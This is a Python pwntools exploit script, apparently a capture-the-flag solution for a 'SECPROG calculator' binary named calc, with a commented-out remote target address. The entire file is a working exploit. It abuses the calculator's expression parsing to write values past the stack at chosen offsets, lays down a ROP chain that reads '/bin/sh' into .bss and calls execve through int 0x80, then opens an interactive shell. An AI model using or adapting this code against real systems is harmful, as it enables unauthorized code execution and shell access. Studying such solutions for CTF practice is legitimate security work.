from pwn import *

p = process("./calc")
#p = remote("111.198.29.45",30418)
elf = ELF("./calc")
offset = 360
# gdb.attach(p , "b eval")
def setV(index , value):
	pos = offset + 1 + index
	p.sendline("+{}+1".format(pos))
	addr_i = p.recvuntil("\n" , drop=True)
	print(hex(int(addr_i)))
	# print()
	if addr_i != "0":
		p.sendline("+{}-{}".format(pos , addr_i))
		p.recvline()
	if value != 0:
		p.sendline("+{}+{}".format(pos , value))
		p.recvline()

p.recvuntil("=== Welcome to SECPROG calculator ===\n")

temp = elf.bss() + 0x200
read_addr = 0x0806e6d0
pop_eax_r = 0x0805c34b
pop_d_c_b_r = 0x080701d0
int_0x80 = 0x08049a21

# payload = p32(read_addr) + p32(pop_d_c_b_r) + p32(0) + p32(temp) + p32(0x10)
# payload += p32(pop_d_c_b_r) + p32(0) + p32(0) + p32(temp)
# payload += p32(pop_eax_r) + p32(0xb)
# payload += p32(int_0x80)
payload_list = [read_addr , pop_d_c_b_r , 0 , temp , 0x10 , pop_d_c_b_r , 0 , 0 , temp , pop_eax_r , 0xb , int_0x80]
for i in range(len(payload_list)):
	setV(i , payload_list[i])
p.sendline("")
p.send("/bin/sh\x00")

p.interactive()
